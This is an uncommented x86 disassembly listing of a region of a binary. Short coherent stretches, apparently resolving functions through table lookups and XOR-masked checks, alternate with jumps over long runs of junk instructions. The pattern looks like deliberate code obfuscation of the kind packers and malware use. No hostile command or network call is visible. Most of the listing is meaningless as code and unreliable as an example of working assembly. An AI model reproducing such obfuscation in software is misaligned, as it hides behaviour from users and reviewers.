  40b93d:	inc    ebp
  40b93e:	in     al,dx
  40b93f:	mov    ecx,DWORD PTR [ebp+0x8]
  40b942:	add    ecx,DWORD PTR [eax+0x1c]
  40b945:	xor    esi,esi
  40b947:	mov    DWORD PTR [ebp-0x14],ecx
  40b94a:	mov    eax,DWORD PTR [ebp-0x28]
  40b94d:	mov    ecx,DWORD PTR [ebp+0x8]
  40b950:	add    ecx,DWORD PTR [eax+edi*4]
  40b953:	jmp    0x40ba38
  40b958:	pop    ss
  40b959:	pusha  
  40b95a:	pop    esp
  40b95b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b95c:	jns    0x40b916
  40b95e:	out    0x61,eax
  40b960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b961:	push   ds
  40b962:	jg     0x40b96d
  40b964:	mov    al,ds:0x79dac447
  40b969:	xor    edi,DWORD PTR [esi+0x7e]
  40b96c:	mov    dh,0x7e
  40b96e:	jle    0x40b9ee
  40b970:	mov    al,ds:0x740ec341
  40b975:	ja     0x40b92c
  40b977:	mov    ebp,0x6a38eb80
  40b97c:	pushf  
  40b97d:	cmp    BYTE PTR [edx],al
  40b97f:	and    ecx,DWORD PTR [ebx-0x19407d47]
  40b985:	mov    ds:0xcfdf46b,al
  40b98a:	push   0xf037d139
  40b98f:	inc    edi
  40b990:	lods   eax,DWORD PTR ds:[esi]
  40b991:	cmc    
  40b992:	out    dx,eax
  40b993:	les    ebx,FWORD PTR [ecx]
  40b995:	int3   
  40b996:	pop    ebx
  40b997:	sbb    cl,dh
  40b999:	and    bl,BYTE PTR [ebx+ecx*1-0x65ae35f1]
  40b9a0:	add    al,0x19
  40b9a2:	nop
  40b9a3:	or     BYTE PTR [esp+edx*8+0x3e],cl
  40b9a7:	dec    ebx
  40b9a8:	or     BYTE PTR [esi],bh
  40b9aa:	cs stos DWORD PTR es:[edi],eax
  40b9ac:	sbb    edi,ecx
  40b9ae:	imul   ebx,DWORD PTR [esi-0x3eea0ca],0x69316870
  40b9b8:	push   edi
  40b9b9:	imul   edi,esi,0x38
  40b9bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9bd:	fs jnp 0x40ba1b
  40b9c0:	xchg   edi,eax
  40b9c1:	cmp    BYTE PTR [eax+0x3],dl
  40b9c4:	push   ebx
  40b9c5:	inc    edi
  40b9c6:	mov    ebp,0x42b6e019
  40b9cb:	cli    
  40b9cc:	sbb    ch,BYTE PTR [edx-0x48]
  40b9cf:	push   edx
  40b9d0:	xor    BYTE PTR [eax],dl
  40b9d2:	inc    eax
  40b9d3:	mov    eax,0x2a8d8478
  40b9d8:	cmp    cl,BYTE PTR [ebx-0x3adb2461]
  40b9de:	fnstenv [edx-0x57c32759]
  40b9e4:	sbb    eax,0xadb3cabb
  40b9e9:	cld    
  40b9ea:	fidivr DWORD PTR [eax-0x337d87bf]
  40b9f0:	sub    DWORD PTR [edx-0x1e209618],0xe54c6b69
  40b9fa:	fucom  st(1)
  40b9fc:	fidiv  DWORD PTR [esi+0x2b32092]
  40ba02:	ins    DWORD PTR es:[edi],dx
  40ba03:	pushf  
  40ba04:	pop    edx
  40ba05:	inc    eax
  40ba06:	jbe    0x40ba15
  40ba08:	fisttp QWORD PTR ds:0xa521ba55
  40ba0e:	lock mov WORD PTR [edx-0x72a45335],?
  40ba15:	push   es
  40ba16:	mul    DWORD PTR [edi-0x47]
  40ba19:	fsub   st(3),st
  40ba1b:	push   ebp
  40ba1c:	sub    BYTE PTR [ebx+ebx*8-0x618bd594],0xee
  40ba24:	adc    al,BYTE PTR [eax+0x1b]
  40ba27:	sbb    DWORD PTR [ebx-0x4424dfc4],eax
  40ba2d:	push   ebp
  40ba2e:	(bad)  
  40ba2f:	retf   0x8d71
  40ba32:	add    al,0xe6
  40ba34:	aaa    
  40ba35:	xchg   ebx,eax
  40ba36:	mov    eax,0xf8458d02
  40ba3b:	mov    DWORD PTR [ebp-0x30],ecx
  40ba3e:	push   eax
  40ba3f:	push   DWORD PTR [ebp-0x30]
  40ba42:	push   DWORD PTR [ebp+0xc]
  40ba45:	call   0x408325
  40ba4a:	mov    eax,DWORD PTR [ebp-0x4]
  40ba4d:	mov    ecx,DWORD PTR [ebp-0x8]
  40ba50:	xor    eax,0x7510859
  40ba55:	add    eax,ebx
  40ba57:	cmp    ecx,eax
  40ba59:	jne    0x40bb61
  40ba5f:	mov    eax,DWORD PTR [ebp-0x20]
  40ba62:	jmp    0x40bb47
  40ba67:	test   BYTE PTR [ebx+0x5b],al
  40ba6a:	scas   al,BYTE PTR es:[edi]
  40ba6b:	pop    ecx
  40ba6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba6d:	jns    0x40bae8
  40ba6f:	and    BYTE PTR [ebx+0x63],cl
  40ba72:	lock adc DWORD PTR ds:0x30b1150c,esp
  40ba79:	jle    0x40baf9
  40ba7b:	mov    dh,0x7e
  40ba7d:	jle    0x40bafd
  40ba7f:	pop    esp
  40ba80:	push   es
  40ba81:	jne    0x40ba65
  40ba83:	add    eax,0xd8f1805
  40ba88:	fsubr  QWORD PTR [ebx]
  40ba8a:	push   ecx
  40ba8b:	fdivr  st(5),st
  40ba8d:	aad    0x64
  40ba8f:	cmp    ch,BYTE PTR [ecx+0x1c90212b]
  40ba95:	jecxz  0x40ba17
  40ba97:	push   0x60
  40ba99:	pop    es
  40ba9a:	cwde   
  40ba9b:	sar    BYTE PTR [edi-0x28],0x38
  40ba9f:	inc    ebp
  40baa0:	pop    es
  40baa1:	push   ss
  40baa2:	loop   0x40baed
  40baa4:	ficom  DWORD PTR [eax-0x64]
  40baa7:	out    dx,eax
  40baa8:	dec    ebx
  40baa9:	lds    edi,FWORD PTR [edi-0xb523d65]
  40baaf:	and    al,0x34
  40bab1:	adc    DWORD PTR [esi-0x47],eax
  40bab4:	repnz mov ds:0xc83afb4e,al
  40baba:	mov    ch,0x57
  40babc:	pop    es
  40babd:	pop    ebp
  40babe:	add    al,0x14
  40bac0:	les    edx,FWORD PTR [eax-0x6f]
  40bac3:	pusha  
  40bac4:	and    BYTE PTR [ecx+ecx*4-0x34],ch
  40bac8:	inc    esi
  40bac9:	retf   
  40baca:	xlat   BYTE PTR ds:[ebx]
  40bacb:	outs   dx,DWORD PTR ds:[esi]
  40bacc:	mov    ebp,ss
  40bace:	outs   dx,BYTE PTR ds:[esi]
  40bacf:	repz pusha 
  40bad1:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40bad3:	add    eax,0xda87e128
  40bad8:	neg    DWORD PTR [esi-0x65]
  40badb:	icebp  
  40badc:	xchg   esp,eax
  40badd:	pop    es
  40bade:	sub    eax,0x2eec2a06
  40bae3:	jmp    0x99c8c4cd
  40bae8:	jmp    0x282c:0x12a7681e
  40baef:	sbb    ebp,ecx
  40baf1:	push   ds
  40baf2:	mov    al,ds:0xe8191778
  40baf7:	in     eax,dx
  40baf8:	sbb    edi,DWORD PTR [edi+0x69380653]
  40bafe:	dec    ecx
  40baff:	mov    esi,0x6427dfd2
  40bb04:	push   ecx
  40bb05:	repz arpl WORD PTR [eax],bp
  40bb08:	shr    DWORD PTR [ebp-0x50ebc7c0],1
  40bb0e:	lds    edi,FWORD PTR [edi-0x33]
  40bb11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb12:	and    al,0xde
  40bb14:	rcl    DWORD PTR [eax],0x45
  40bb17:	xlat   BYTE PTR ds:[ebx]
  40bb18:	jnp    0x40bb12
  40bb1a:	push   ebx
  40bb1b:	mov    edi,0xa07a85c9
  40bb20:	stos   DWORD PTR es:[edi],eax
  40bb21:	out    0xb6,eax
  40bb23:	call   0xb77c:0xdeeb1ba6
  40bb2a:	xchg   edi,eax
  40bb2b:	jbe    0x40bb0f
  40bb2d:	jmp    0xc0a628c2
  40bb32:	cmp    ecx,DWORD PTR [eax-0x53]
  40bb35:	pop    esi
  40bb36:	xor    DWORD PTR [edx+0x55],edi
  40bb39:	inc    ebp
  40bb3a:	icebp  
  40bb3b:	sar    DWORD PTR [esi],1
  40bb3d:	mov    al,0xc9
  40bb3f:	outs   dx,BYTE PTR ds:[esi]
  40bb40:	lea    edi,[edx-0x474cbb9f]
  40bb46:	jbe    0x40bb8f
  40bb48:	cmp    edi,eax
  40bb4a:	jb     0x40b2a5
  40bb50:	jmp    0x40bb71
  40bb55:	mov    eax,DWORD PTR [ebp-0x4]
  40bb58:	xor    eax,esi
  40bb5a:	add    eax,ebx
  40bb5c:	jmp    0x40c696
  40bb61:	mov    eax,DWORD PTR [ebp-0x2c]
  40bb64:	movzx  eax,WORD PTR [eax+edi*2]
  40bb68:	mov    ecx,DWORD PTR [ebp-0x14]
  40bb6b:	mov    eax,DWORD PTR [ecx+eax*4]
  40bb6e:	mov    DWORD PTR [ebp+0xc],eax
  40bb71:	mov    eax,DWORD PTR [ebp-0x4]
  40bb74:	mov    ecx,DWORD PTR [ebp-0x8]
  40bb77:	xor    eax,0x7510859
  40bb7c:	add    eax,ebx
  40bb7e:	cmp    ecx,eax
  40bb80:	jne    0x40bb93
  40bb86:	mov    eax,DWORD PTR [ebp-0x4]
  40bb89:	xor    eax,0x7510859
  40bb8e:	jmp    0x40bb5a
  40bb93:	mov    eax,DWORD PTR [ebp+0xc]
  40bb96:	add    eax,DWORD PTR [ebp+0x8]
  40bb99:	mov    DWORD PTR [ebp-0x10],eax
  40bb9c:	mov    eax,DWORD PTR [ebp-0x1c]
  40bb9f:	test   eax,eax
  40bba1:	je     0x40c2b4
  40bba7:	mov    DWORD PTR [ebp-0x24],esi
  40bbaa:	push   0xb
  40bbac:	pop    ecx
  40bbad:	push   0x5
  40bbaf:	dec    ecx
  40bbb0:	jmp    0x40bc95
  40bbb5:	pop    ss
  40bbb6:	imul   dh
  40bbb8:	mov    bl,0x6f
  40bbba:	jnp    0x40bb77
  40bbbc:	push   0xffffffce
  40bbbe:	pop    ecx
  40bbbf:	and    esi,ebx
  40bbc1:	jnp    0x40bbe8
  40bbc3:	outs   dx,DWORD PTR fs:[esi]
  40bbc5:	mov    DWORD PTR [ecx],esi
  40bbc7:	jle    0x40bc47
  40bbc9:	mov    dh,0x7e
  40bbcb:	jle    0x40bc4b
  40bbcd:	fimul  WORD PTR [ebx]
  40bbcf:	pop    ebx
  40bbd0:	(bad)  
  40bbd1:	scas   al,BYTE PTR es:[edi]
  40bbd2:	call   0x6131:0xf0bf5356
  40bbd9:	adc    BYTE PTR [edx],bh
  40bbdb:	and    eax,0xbc823b6a
  40bbe0:	mov    eax,ds:0x5d2c5a3c
  40bbe5:	outs   dx,BYTE PTR ds:[esi]
  40bbe6:	(bad)  
  40bbe7:	fsubr  DWORD PTR [esi]
  40bbe9:	inc    DWORD PTR [ecx+0x543f6108]
  40bbef:	in     eax,0x66
  40bbf1:	fistp  QWORD PTR [ecx+0x3610c503]
  40bbf7:	scas   eax,DWORD PTR es:[edi]
  40bbf8:	ins    DWORD PTR es:[edi],dx
  40bbf9:	dec    edi
  40bbfa:	hlt    
  40bbfb:	and    al,0x2f
  40bbfd:	out    0x45,al
  40bbff:	jno    0x40bbac
  40bc01:	call   FWORD PTR [ebp+0x247a3d4b]
  40bc07:	xor    ebp,DWORD PTR [eax+0xd0c4d80]
  40bc0d:	pop    ecx
  40bc0e:	mov    ecx,0x2c306dc5
  40bc13:	inc    ebx
  40bc14:	xor    al,0x79
  40bc16:	sbb    BYTE PTR [ebx-0x53279bd8],cl
  40bc1c:	sbb    dl,bl
  40bc1e:	mov    ch,0xf5
  40bc20:	pop    edi
  40bc21:	aaa    
  40bc22:	pop    ebx
  40bc23:	dec    esi
  40bc24:	int3   
  40bc25:	pop    esp
  40bc26:	mov    bl,0x43
  40bc28:	rol    BYTE PTR [esi+0x796f2d0a],cl
  40bc2e:	aam    0xfd
  40bc30:	push   cs
  40bc31:	mov    ebx,0xa3bf299d
  40bc36:	daa    
  40bc37:	pop    esp
  40bc38:	push   esp
  40bc39:	pop    ss
  40bc3a:	mov    al,0xd8
  40bc3c:	ret    
  40bc3d:	mov    BYTE PTR [esp+eax*2-0x2b],al
  40bc41:	ficom  WORD PTR [eax]
  40bc43:	jbe    0x40bca3
  40bc45:	sbb    DWORD PTR [esi-0x6648130d],eax
  40bc4b:	mov    dh,0x8c
  40bc4d:	in     eax,0x9e
  40bc4f:	jno    0x40bc2c
  40bc51:	sbb    BYTE PTR [edi-0x646f71dc],ah
  40bc57:	sbb    cx,WORD PTR [eax-0x12447ff0]
  40bc5e:	mov    ebp,0xeac7e6e7
  40bc63:	lock in eax,dx
  40bc65:	mov    ah,0x5e
  40bc67:	aad    0x4d
  40bc69:	std    
  40bc6a:	(bad)  
  40bc6b:	lock cwde 
  40bc6d:	sub    edx,DWORD PTR [edi]
  40bc6f:	jo     0x40bbfe
  40bc71:	xchg   edi,eax
  40bc72:	ret    0xaa1d
  40bc75:	cmp    eax,0xae025321
  40bc7a:	jmp    0x40bcc3
  40bc7c:	inc    ecx
  40bc7d:	sbb    esi,ecx
  40bc7f:	xrelease xchg DWORD PTR [eax],edi
  40bc82:	or     bh,BYTE PTR [ecx+0x3f6ddf03]
  40bc88:	retf   
  40bc89:	ss xor al,0xbb
  40bc8c:	jecxz  0x40bc7b
  40bc8e:	loop   0x40bc43
  40bc90:	pop    ss
  40bc91:	xor    ebx,DWORD PTR [ebx-0x78a4c0ce]
  40bc97:	retf   
  40bc98:	sub    ebx,ecx
  40bc9a:	xchg   ebx,ecx
  40bc9c:	dec    ecx
  40bc9d:	mov    eax,DWORD PTR [ebp-0x1c]
  40bca0:	imul   eax,ecx
  40bca3:	sub    esp,eax
  40bca5:	mov    DWORD PTR [ebp-0x24],esp
  40bca8:	mov    eax,DWORD PTR [ebp-0x4]
  40bcab:	mov    ecx,0x7510859
  40bcb0:	jmp    0x40bd95
  40bcb5:	xchg   edi,eax
  40bcb6:	adc    DWORD PTR [ecx+eax*2+0x78],0x79
  40bcbb:	mov    ebx,0xdff72d79
  40bcc0:	ins    DWORD PTR es:[edi],dx
  40bcc1:	test   al,0x53
  40bcc3:	sbb    al,0xcc
  40bcc5:	shl    DWORD PTR [esi],0x7e
  40bcc8:	jle    0x40bc80
  40bcca:	jle    0x40bd4a
  40bccc:	jle    0x40bc72
  40bcce:	xlat   BYTE PTR ds:[ebx]
  40bccf:	mov    bl,0x5c
  40bcd1:	mov    edi,0xed3b8a90
  40bcd6:	jmp    0x40bc68
  40bcd8:	enter  0x3a7,0x20
  40bcdc:	push   ecx
  40bcdd:	ficom  WORD PTR ds:0x3f13a891
  40bce3:	lock sub bh,BYTE PTR [edi+eax*1]
  40bce7:	xchg   al,bh
  40bce9:	mov    DWORD PTR [edx+0x48],edx
  40bcec:	add    ebx,DWORD PTR [eax+0x48a23490]
  40bcf2:	push   es
  40bcf3:	sbb    al,0x14
  40bcf5:	out    0xc1,eax
  40bcf7:	mov    dh,0x90
  40bcf9:	xor    BYTE PTR [ebp+0x4c117dbb],bh
  40bcff:	rol    bh,1
  40bd01:	ja     0x40bcf0
  40bd03:	es ja  0x40bd25
  40bd06:	xor    ecx,esp
  40bd08:	add    ebx,esi
  40bd0a:	loopne 0x40bcde
  40bd0c:	mov    ecx,0x35efbdb
  40bd11:	lds    ebx,FWORD PTR [edx+esi*4+0x57fcbbb3]
  40bd18:	mov    ebp,0xbe69fe53
  40bd1d:	or     al,0xa9
  40bd1f:	pop    ds
  40bd20:	add    bh,ah
  40bd22:	mov    es,WORD PTR [ebx+0x337e7e71]
  40bd28:	iret   
  40bd29:	sbb    ebp,DWORD PTR [esi]
  40bd2b:	jg     0x40bcea
  40bd2d:	js     0x40bcf3
  40bd2f:	dec    edi
  40bd30:	push   ecx
  40bd31:	test   DWORD PTR [ecx+esi*2],edx
  40bd34:	mov    al,ds:0xb571c98c
  40bd39:	add    ah,BYTE PTR [ebx]
  40bd3b:	cmp    ebp,DWORD PTR [edi-0x60]
  40bd3e:	add    DWORD PTR ds:0x69f5ef0f,ecx
  40bd44:	cmp    cl,BYTE PTR [edx+0x52beb6ab]
  40bd4a:	popa   
  40bd4b:	mov    al,ds:0x691abc74
  40bd50:	push   esi
  40bd51:	adc    DWORD PTR [edi-0x2bc76ce],eax
  40bd57:	adc    dh,BYTE PTR [ebx-0x2c]
  40bd5a:	cmp    al,0x5d
  40bd5c:	aas    
  40bd5d:	dec    esp
  40bd5e:	or     BYTE PTR [eax],dh
  40bd60:	mov    edi,0x83ccda21
  40bd65:	push   esi
  40bd66:	popf   
  40bd67:	push   edi
  40bd68:	push   ecx
  40bd69:	dec    esp
  40bd6a:	int    0x6a
  40bd6c:	stos   DWORD PTR es:[edi],eax
  40bd6d:	cmp    edx,DWORD PTR [ebp-0x59]
  40bd70:	jo     0x40bd51
  40bd72:	xor    ecx,DWORD PTR [eax]
  40bd74:	dec    edi
  40bd75:	push   esi
  40bd76:	les    eax,FWORD PTR [ecx-0x2228b2a1]
  40bd7c:	mov    ds:0x331ab2fe,eax
  40bd81:	ficom  DWORD PTR [edi]
  40bd83:	inc    edx
  40bd84:	mov    eax,0x2cb9c1fa
  40bd89:	cpuid  
  40bd8b:	pop    ecx
  40bd8c:	cli    
  40bd8d:	in     eax,0x12
  40bd8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd90:	dec    eax
  40bd91:	fisub  WORD PTR [ecx-0x3eccaafc]
  40bd97:	mov    edx,0x32729f
  40bd9c:	add    eax,edx
  40bd9e:	mov    DWORD PTR [ebp+0x8],eax
  40bda1:	mov    eax,DWORD PTR [ebp-0x18]
  40bda4:	xor    eax,ecx
  40bda6:	add    eax,edx
  40bda8:	mov    edx,DWORD PTR [ebp+0x14]
  40bdab:	jmp    0x40be90
  40bdb0:	dec    DWORD PTR [ebx-0x47d6c7ef]
  40bdb6:	xchg   DWORD PTR [ecx-0x43979b07],edi
  40bdbc:	cmp    al,ch
  40bdbe:	cmp    dl,BYTE PTR [edx]
  40bdc0:	sbb    DWORD PTR [edi],esi
  40bdc2:	jle    0x40be42
  40bdc4:	mov    dh,0x7e
  40bdc6:	jle    0x40be46
  40bdc8:	pop    esi
  40bdc9:	lds    ecx,FWORD PTR [esi+0x66]
  40bdcc:	shl    eax,0x27
  40bdcf:	ins    DWORD PTR es:[edi],dx
  40bdd0:	adc    al,0x55
  40bdd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bdd3:	imul   ebp,DWORD PTR [ebx],0x479bb629
  40bdd9:	out    dx,eax
  40bdda:	and    eax,0x7ce784a9
  40bddf:	cdq    
  40bde0:	test   al,0xb4
  40bde2:	sub    BYTE PTR [ebp-0x6cbdaf1],bh
  40bde8:	pop    ss
  40bde9:	das    
  40bdea:	add    BYTE PTR [ecx-0x7f],0xd8
  40bdee:	ret    0x2be5
  40bdf1:	clc    
  40bdf2:	std    
  40bdf3:	mov    ch,BYTE PTR ds:0x7b815cf0
  40bdf9:	jecxz  0x40bd8c
  40bdfb:	aam    0x88
  40bdfd:	add    eax,0x92417b2b
  40be02:	jg     0x40bd91
  40be04:	lahf   
  40be05:	imul   esi,DWORD PTR ds:0x6558b7ae,0x56
  40be0c:	repnz aas 
  40be0e:	ror    edx,1
  40be10:	xor    al,0xfe
  40be12:	push   cs
  40be13:	(bad)  
  40be14:	mov    edx,0xc717fe10
  40be19:	je     0x40be72
  40be1b:	mov    cl,BYTE PTR [edx]
  40be1d:	aam    0xf8
  40be1f:	jae    0x40be6a
  40be21:	xchg   ebx,eax
  40be22:	ja     0x40bdbe
  40be24:	imul   ebp,DWORD PTR [edx-0x720e7d40],0xe
  40be2b:	cmp    al,BYTE PTR [bp+di-0x32]
  40be2f:	pop    esi
  40be30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be31:	sahf   
  40be32:	sub    WORD PTR [edi],ax
  40be35:	loope  0x40be1a
  40be37:	push   ss
  40be38:	cs xchg esi,eax
  40be3a:	xlat   BYTE PTR ds:[ebx]
  40be3b:	mov    eax,0x3cc302d8
  40be40:	(bad)  
  40be41:	push   es
  40be42:	ret    0x61e0
  40be45:	loopne 0x40be14
  40be47:	pushf  
  40be48:	fwait
  40be49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be4a:	sub    ebp,DWORD PTR [ecx-0x37]
  40be4d:	jmp    0xa297:0xeaa9e7ce
  40be54:	(bad)  
  40be55:	ins    BYTE PTR es:[edi],dx
  40be56:	mov    ds,edx
  40be58:	push   esi
  40be59:	sub    BYTE PTR [edx-0x534c236c],al
  40be5f:	fucomp st(4)
  40be61:	xchg   esp,eax
  40be62:	fistp  DWORD PTR [esi]
  40be64:	push   ebx
  40be65:	push   0xfffffffc
  40be67:	push   es
  40be68:	dec    eax
  40be69:	in     eax,0x7f
  40be6b:	adc    DWORD PTR [ebx],ebx
  40be6d:	sbb    esi,DWORD PTR [ebx-0x6f1dc8e7]
  40be73:	repnz jecxz 0x40be5d
  40be76:	dec    ecx
  40be77:	inc    edx
  40be78:	push   esp
  40be79:	sub    BYTE PTR [esi+0x39],ah
  40be7c:	int    0x70
  40be7e:	cmp    ebp,ecx
  40be80:	jo     0x40be8e
  40be82:	mov    ds:0xb27f16a9,eax
  40be87:	cmp    BYTE PTR [ecx+0x3bb1f754],dh
  40be8d:	push   edx
  40be8e:	fcomp  QWORD PTR [edi+ecx*1-0x51]
  40be92:	add    ch,cl
  40be94:	loopne 0x40be96
  40be96:	add    BYTE PTR [eax],al
  40be98:	inc    ebp
  40be99:	loop   0x40be83
  40be9b:	xchg   edi,eax
  40be9c:	imul   esp,DWORD PTR [ebp-0x36f31fa7],0x68c47640
  40bea6:	scas   eax,DWORD PTR es:[edi]
  40bea7:	mov    al,0x51
  40bea9:	aaa    
  40beaa:	jle    0x40bf2a
  40beac:	mov    dh,0x7e
  40beae:	jle    0x40bf2e
  40beb0:	add    eax,DWORD PTR [edi+0x67]
  40beb3:	dec    ecx
  40beb4:	xor    eax,esp
  40beb6:	jno    0x40be7d
  40beb8:	shl    eax,0xb7
  40bebb:	dec    edx
  40bebc:	mov    ?,ebx
  40bebe:	or     al,0x43
  40bec0:	cmp    bh,dh
  40bec2:	call   0xdd32aba0
  40bec7:	and    BYTE PTR [esi+0x22fbad4c],bh
  40becd:	cmp    edx,DWORD PTR [eax]
  40becf:	pop    edx
  40bed0:	mov    BYTE PTR [eax+edx*4],dl
  40bed3:	ins    DWORD PTR es:[edi],dx
  40bed4:	fisttp WORD PTR [ebp+0x5031dd8f]
  40beda:	xchg   edi,eax
  40bedb:	sub    al,0x87
  40bedd:	std    
  40bede:	test   dh,bh
  40bee0:	int    0xaa
  40bee2:	jge    0x40bf33
  40bee4:	or     esp,DWORD PTR [ebx+0x7fd78a38]
  40beea:	bound  ebx,QWORD PTR [esi+0x16]
  40beed:	cmc    
  40beee:	jle    0x40bea6
  40bef0:	inc    ebx
  40bef1:	jns    0x40be9a
  40bef3:	xor    DWORD PTR ds:0x531716bb,ecx
  40bef9:	or     BYTE PTR [ebx+0x33],bl
  40befc:	sub    DWORD PTR [eax+0x4336fba8],ebp
  40bf02:	mov    ?,ebx
  40bf04:	test   DWORD PTR [ecx-0x70],edx
  40bf07:	sti    
  40bf08:	cld    
  40bf09:	mov    ch,BYTE PTR [edx+esi*8+0x52]
  40bf0d:	push   cs
  40bf0e:	sahf   
  40bf0f:	fstp   QWORD PTR [esi+0x77]
  40bf12:	adc    al,0x95
  40bf14:	and    DWORD PTR [ecx+edx*4],esi
  40bf17:	or     esi,esp
  40bf19:	addr16 jge 0x40beeb
  40bf1c:	pop    ecx
  40bf1d:	inc    ecx
  40bf1e:	jb     0x40bec3
  40bf20:	xchg   edi,eax
  40bf21:	cmp    BYTE PTR [ecx+edi*2],ah
  40bf24:	inc    esp
  40bf25:	jo     0x40bf0e
  40bf27:	xor    DWORD PTR [edi],edi
  40bf29:	xor    BYTE PTR [edx+edi*2],dh
  40bf2c:	dec    edx
  40bf2d:	mov    eax,0xd9754019
  40bf32:	cwde   
  40bf33:	repz inc esp
  40bf35:	aam    0xe4
  40bf37:	sahf   
  40bf38:	mov    bh,0x76
  40bf3a:	in     eax,0x4b
  40bf3c:	adc    ecx,DWORD PTR [edi-0x7ed9b7f1]
  40bf42:	dec    edx
  40bf43:	push   DWORD PTR [edx-0x2b]
  40bf46:	in     al,dx
  40bf47:	dec    edi
  40bf48:	jg     0x40bee4
  40bf4a:	nop
  40bf4b:	fs repnz inc edx
  40bf4e:	mov    ecx,0x84246d1c
  40bf53:	pop    ebx
  40bf54:	and    al,0x67
  40bf56:	repnz stos DWORD PTR es:[edi],eax
  40bf58:	test   BYTE PTR [ebx-0x1a],dh
  40bf5b:	jge    0x40bf79
  40bf5d:	and    ah,BYTE PTR [ebx-0xa]
  40bf60:	mov    ah,0xc2
  40bf62:	(bad)  
  40bf63:	stc    
  40bf64:	jmp    0x40bfbb
  40bf66:	push   ss
  40bf67:	adc    bl,BYTE PTR [esp+edx*2+0x4a]
  40bf6b:	loopne 0x40bfd3
  40bf6d:	inc    edi
  40bf6e:	pop    eax
  40bf6f:	cmp    esi,DWORD PTR [ebp-0x5f6937f]
  40bf75:	outs   dx,DWORD PTR ds:[esi]
  40bf76:	push   edx
  40bf77:	ror    DWORD PTR [ebx-0x2ecc03ab],1
  40bf7d:	mov    ecx,DWORD PTR [ebp+0x8]
  40bf80:	lea    ecx,[edx+ecx*1+0x32729f]
  40bf87:	cmp    ecx,eax
  40bf89:	je     0x40c1ca
  40bf8f:	mov    edi,DWORD PTR [ebp-0x18]
  40bf92:	mov    eax,DWORD PTR [ebp+0x8]
  40bf95:	mov    edx,DWORD PTR [ebp+0x14]
  40bf98:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40bf9c:	jmp    0x40c081
  40bfa1:	pop    ss
  40bfa2:	sub    al,0x93
  40bfa4:	sub    edi,DWORD PTR [ecx+0x192097b9]
  40bfaa:	jne    0x40bf81
  40bfac:	stos   BYTE PTR es:[edi],al
  40bfad:	popa   
  40bfae:	push   ebx
  40bfaf:	push   ebp
  40bfb0:	es test eax,0xb67e7e34
  40bfb6:	jle    0x40c036
  40bfb8:	jle    0x40bfd4
  40bfba:	repnz ins BYTE PTR es:[edi],dx
  40bfbc:	cld    
  40bfbd:	iret   
  40bfbe:	das    
  40bfbf:	mov    BYTE PTR ds:0x92e9035e,ch
  40bfc5:	pop    es
  40bfc6:	or     BYTE PTR [ebx],cl
  40bfc8:	retf   0xceac
  40bfcb:	dec    esp
  40bfcc:	mov    bh,0x2f
  40bfce:	aam    0xd0
  40bfd0:	jo     0x40bffe
  40bfd2:	and    al,0x29
  40bfd4:	stos   DWORD PTR es:[edi],eax
  40bfd5:	sub    eax,0x9a3e8c88
  40bfda:	pop    esp
  40bfdb:	jnp    0x40bf63
  40bfdd:	and    BYTE PTR [edi],0xe9
  40bfe0:	mov    WORD PTR [ebx-0x1ef84589],ds
  40bfe6:	jg     0x40c054
  40bfe8:	adc    esi,DWORD PTR [edx]
  40bfea:	mov    edx,0xbf1b36d7
  40bfef:	lahf   
  40bff0:	adc    bl,al
  40bff2:	xchg   ebx,eax
  40bff3:	jl     0x40c065
  40bff5:	rcl    DWORD PTR [edx-0x450a0e50],0x2f
  40bffc:	enter  0xd2e7,0xda
  40c000:	add    eax,0xb890839f
  40c006:	outs   dx,BYTE PTR ds:[esi]
  40c007:	(bad)  
  40c008:	out    dx,al
  40c009:	jne    0x40bfca
  40c00b:	cli    
  40c00c:	add    eax,0x64e2780b
  40c011:	test   DWORD PTR [esi+0x5048036f],edx
  40c017:	rol    cl,0xdb
  40c01a:	jmp    0x40c057
  40c01c:	(bad)  
  40c01d:	push   ss
  40c01e:	xchg   esi,eax
  40c01f:	xchg   ecx,eax
  40c020:	jb     0x40c062
  40c022:	fsub   DWORD PTR [esi+ecx*2]
  40c025:	jmp    0x40c02b
  40c027:	sub    eax,0xb8a09253
  40c02c:	xchg   ebp,eax
  40c02d:	cmp    eax,0x89516710
  40c032:	out    0x16,eax
  40c034:	xor    al,0x14
  40c036:	les    edx,FWORD PTR [ebp+0x247b9a4b]
  40c03c:	jge    0x40c092
  40c03e:	xchg   esp,eax
  40c03f:	test   BYTE PTR [eax+ebx*1+0x1c6552e2],0x83
  40c047:	xor    al,0xb2
  40c04a:	sub    esp,DWORD PTR [ecx-0x2d0cea47]
  40c050:	jns    0x40c04d
  40c052:	shld   ecx,esp,cl
  40c055:	out    0xd3,eax
  40c057:	mov    edi,0xdc7cf6ff
  40c05c:	mov    dl,0x6e
  40c05e:	inc    esi
  40c05f:	xchg   ebp,eax
  40c060:	cmc    
  40c061:	fnsave [esi-0x4d8c00b9]
  40c067:	mov    cl,0x4e
  40c069:	(bad)  
  40c06a:	jle    0x40c06a
  40c06c:	inc    ebx
  40c06d:	xchg   DWORD PTR [esi+0x50],ebp
  40c070:	mov    fs,WORD PTR [eax+0x60]
  40c073:	mov    edi,0xf1c4c0f6
  40c078:	mov    ecx,0x8f5a3ab0
  40c07d:	bound  esi,QWORD PTR [esi-0x38]
  40c080:	cmp    DWORD PTR [ecx+0x7510859],0x33
  40c087:	shl    BYTE PTR [ebx],cl
  40c089:	stc    
  40c08a:	mov    esi,0x32729f
  40c08f:	add    edi,esi
  40c091:	div    edi
  40c093:	mov    edx,DWORD PTR [ebp-0x4]
  40c096:	xor    edx,ecx
  40c098:	lea    eax,[edx+eax*1+0x32729f]
  40c09f:	mov    edx,DWORD PTR [ebp+0x8]
  40c0a2:	mov    edi,DWORD PTR [ebp-0x24]
  40c0a5:	mov    DWORD PTR [edi+edx*4],eax
  40c0a8:	mov    eax,DWORD PTR [ebp-0x18]
